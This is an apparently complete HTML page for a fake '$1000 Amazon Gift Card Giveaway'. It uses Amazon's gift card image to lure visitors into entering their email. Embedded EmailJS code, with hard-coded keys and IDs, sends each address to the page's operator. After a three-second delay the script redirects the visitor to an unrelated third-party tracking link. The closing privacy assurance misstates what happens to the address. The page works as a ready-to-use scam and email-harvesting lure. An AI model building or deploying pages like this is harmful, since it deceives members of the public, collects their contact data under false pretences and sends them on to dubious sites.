<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>$1000 Amazon Gift Card Giveaway</title>

<style>
  body{margin:0;font-family:Arial,sans-serif;background:#f8f8f8;color:#333;text-align:center}
  header{background:#0d243d;color:#fff;padding:18px;font-size:28px;font-weight:700}
  .card{max-width:420px;margin:30px auto;background:#fff;padding:25px;border-radius:12px;
        box-shadow:0 0 12px rgba(0,0,0,.08)}
  h1{color:#e47911;font-size:28px;margin-top:0}
  p{margin:14px 0;font-size:16px}
  img{max-width:100%;border-radius:10px;margin:18px 0}
  input[type=email]{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px}
  button{margin-top:15px;background:#ff9d00;color:#fff;border:none;border-radius:6px;
         padding:14px 25px;font-size:18px;cursor:pointer}
  button:hover{background:#cc7a00}
  .note{font-size:14px;color:#777;margin-top:10px}
  #thanks{display:none;font-size:20px;color:#28a745;font-weight:600;margin-top:20px}
</style>

<!-- EmailJS CDN -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
  /* 1) تهيئة EmailJS بالمفتاح العام */
  emailjs.init("UWtEugL5TIC6RfnFv");

  function sendEmail(e){
    e.preventDefault();
    const emailField=document.getElementById("email");
    const userEmail=emailField.value.trim();
    if(!userEmail){return;}

    /* 2) إرسال البريد */
    emailjs.send("service_htt7fgh","template_9exxth7",{user_email:userEmail})
      .then(function(){
          /* 3) إظهار رسالة الشكر */
          document.getElementById("thanks").style.display="block";
          document.getElementById("form-area").style.display="none";
          /* 4) إعادة التوجيه إلى رابط العرض بعد 3 ثوانٍ */
          setTimeout(
            ()=>{window.location.href="https://singingsfiles.com/show.php?l=0&u=178843&id=68652";},
            3000
          );
      },function(err){
          alert("Error, please try again later");
      });
  }
</script>
</head>
<body>

<header>Limited‑Time Giveaway</header>

<div class="card">
  <h1>Win a $1000 Amazon Gift Card!</h1>
  <p>Enter your email below and claim your chance. This offer won't last long!</p>

  <img src="https://m.media-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon gift card"/>

  <form id="form-area" onsubmit="sendEmail(event)">
    <input id="email" type="email" placeholder="Enter your email" required />
    <button type="submit">Claim Now</button>
  </form>

  <div id="thanks">Entry confirmed – good luck! Redirecting…</div>

  <p class="note">We respect your privacy. Your email will only be used for this giveaway.</p>
</div>

</body>
</html>
